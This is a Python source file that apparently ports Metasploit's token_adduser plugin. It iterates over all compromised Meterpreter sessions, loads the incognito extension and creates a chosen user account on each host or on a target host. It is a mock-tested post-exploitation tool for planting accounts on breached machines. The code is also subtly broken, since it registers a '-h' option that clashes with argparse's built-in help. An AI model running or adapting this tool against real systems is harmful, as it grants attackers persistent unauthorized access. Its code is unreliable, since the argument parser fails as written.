#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Python Token Adduser Plugin

This is a Python conversion of the Ruby token_adduser.rb plugin.
The goal of this plugin is to attempt to add a user via incognito 
using all connected meterpreter sessions.

Original Ruby version credit to jduck and jseely[at]relaysecurity.com
Python conversion for Metasploit Framework Python migration.

TODO: This should probably find new life as a post module.
"""

import argparse
import logging
import re
from typing import Dict, List, Optional, Any

# Framework imports (these would be part of the Python MSF framework)
try:
    from msf.core.plugin import Plugin
    from msf.ui.console.command_dispatcher import CommandDispatcher
    from msf.core.framework import Framework
except ImportError:
    # Fallback for development/testing
    class Plugin:
        def __init__(self, framework: Any, opts: Dict[str, Any]):
            self.framework = framework
            self.opts = opts
            
    class CommandDispatcher:
        def __init__(self):
            pass
            
    class Framework:
        def __init__(self):
            self.sessions = {}


class TokenCommandDispatcher(CommandDispatcher):
    """Command dispatcher for token_adduser functionality"""
    
    def __init__(self, framework: Framework):
        super().__init__()
        self.framework = framework
        
    @property
    def name(self) -> str:
        return 'Token Adduser'
        
    @property 
    def commands(self) -> Dict[str, str]:
        return {
            'token_adduser': 'Attempt to add an account using all connected meterpreter session tokens'
        }
        
    def cmd_token_adduser(self, *args) -> None:
        """
        Command handler for token_adduser
        
        Args:
            *args: Command line arguments
        """
        parser = argparse.ArgumentParser(
            prog='token_adduser',
            description='Attempt to add an account using all connected meterpreter session tokens'
        )
        parser.add_argument('-h', '--host', 
                          help='Add account to specific host',
                          dest='target_host')
        parser.add_argument('username', 
                          help='Username to add')
        parser.add_argument('password', 
                          help='Password for the new user')
        
        # Handle empty args
        if not args:
            print('Usage: token_adduser [options] <username> <password>')
            parser.print_help()
            return
            
        try:
            parsed_args = parser.parse_args(args)
        except SystemExit:
            return
            
        username = parsed_args.username
        password = parsed_args.password
        host = parsed_args.target_host
        
        # Iterate through all framework sessions
        for sid, session in self.framework.sessions.items():
            if session.session_type != 'meterpreter':
                continue
                
            print(f">> Opening session {session.sid} / {session.session_host}")
            
            # Load incognito if not already loaded
            if not hasattr(session, 'incognito') or not session.incognito:
                try:
                    session.core.use('incognito')
                except Exception as e:
                    print(f"!! Failed to load incognito on {session.sid} / {session.session_host}: {e}")
                    continue
                    
            if not hasattr(session, 'incognito') or not session.incognito:
                print(f"!! Failed to load incognito on {session.sid} / {session.session_host}")
                continue
                
            # Attempt to add user via incognito
            try:
                result = session.incognito.incognito_add_user(host, username, password)
                if result:
                    print(result)
                    
                    # Stop on success if targeting specific host
                    if host and self._is_success_result(result):
                        break
                        
            except Exception as e:
                print(f"!! Error adding user on session {session.sid}: {e}")
                continue
                
    def _is_success_result(self, result: str) -> bool:
        """
        Check if the result indicates success or expected failure conditions
        
        Args:
            result: The result string from incognito_add_user
            
        Returns:
            True if result indicates success or expected failure
        """
        success_patterns = [
            r'\[\+\] Successfully',
            r'\[-\] Password does not meet complexity requirements',
            r'\[-\] User already exists'
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, result):
                return True
        return False


class TokenAdduser(Plugin):
    """
    Python Token Adduser Plugin
    
    Attempts to add a user account using all connected meterpreter session tokens
    via the incognito extension.
    """
    
    def __init__(self, framework: Framework, opts: Dict[str, Any]):
        """
        Initialize the plugin
        
        Args:
            framework: The MSF framework instance
            opts: Plugin options
        """
        super().__init__(framework, opts)
        self.command_dispatcher = TokenCommandDispatcher(framework)
        self._add_console_dispatcher(self.command_dispatcher)
        
    def cleanup(self) -> None:
        """Clean up plugin resources"""
        self._remove_console_dispatcher('Token Adduser')
        
    @property
    def name(self) -> str:
        """Plugin name"""
        return 'token_adduser'
        
    @property
    def description(self) -> str:
        """Plugin description"""
        return 'Attempt to add an account using all connected Meterpreter session tokens'
        
    def _add_console_dispatcher(self, dispatcher: CommandDispatcher) -> None:
        """
        Add command dispatcher to console (framework-specific implementation)
        
        Args:
            dispatcher: The command dispatcher to add
        """
        # This would be implemented by the actual MSF Python framework
        logging.info(f"Adding console dispatcher: {dispatcher.name}")
        
    def _remove_console_dispatcher(self, name: str) -> None:
        """
        Remove command dispatcher from console (framework-specific implementation)
        
        Args:
            name: Name of the dispatcher to remove
        """
        # This would be implemented by the actual MSF Python framework
        logging.info(f"Removing console dispatcher: {name}")


# Plugin metadata for framework registration
PLUGIN_METADATA = {
    'name': 'Token Adduser',
    'description': 'Attempt to add an account using all connected Meterpreter session tokens',
    'author': ['jduck', 'jseely[at]relaysecurity.com', 'Python conversion team'],
    'version': '1.0.0',
    'license': 'MSF_LICENSE',
    'type': 'console_plugin',
    'requirements': ['incognito'],
    'notes': {
        'stability': ['STABLE'],
        'reliability': ['REPEATABLE'],
        'side_effects': ['ACCOUNT_CREATION', 'IOC_IN_LOGS']
    }
}


def create_plugin(framework: Framework, opts: Dict[str, Any] = None) -> TokenAdduser:
    """
    Plugin factory function
    
    Args:
        framework: The MSF framework instance
        opts: Plugin options
        
    Returns:
        TokenAdduser plugin instance
    """
    if opts is None:
        opts = {}
    return TokenAdduser(framework, opts)


if __name__ == '__main__':
    # For testing/development
    logging.basicConfig(level=logging.INFO)
    
    # Mock framework for testing
    class MockSession:
        def __init__(self, sid: int, session_host: str):
            self.sid = sid
            self.session_host = session_host
            self.session_type = 'meterpreter'
            self.incognito = None
            self.core = MockCore()
            
    class MockCore:
        def use(self, extension: str):
            print(f"Loading extension: {extension}")
            
    class MockIncognito:
        def incognito_add_user(self, host: Optional[str], username: str, password: str) -> str:
            return f"[+] Successfully added user {username} to {host or 'local system'}"
            
    class MockFramework:
        def __init__(self):
            self.sessions = {
                1: MockSession(1, '192.168.1.100'),
                2: MockSession(2, '192.168.1.101')
            }
            # Add incognito to sessions
            for session in self.sessions.values():
                session.incognito = MockIncognito()
    
    # Test the plugin
    framework = MockFramework()
    plugin = create_plugin(framework)
    
    # Test command
    plugin.command_dispatcher.cmd_token_adduser('testuser', 'testpass123')
    
    print("\nPlugin created and tested successfully!")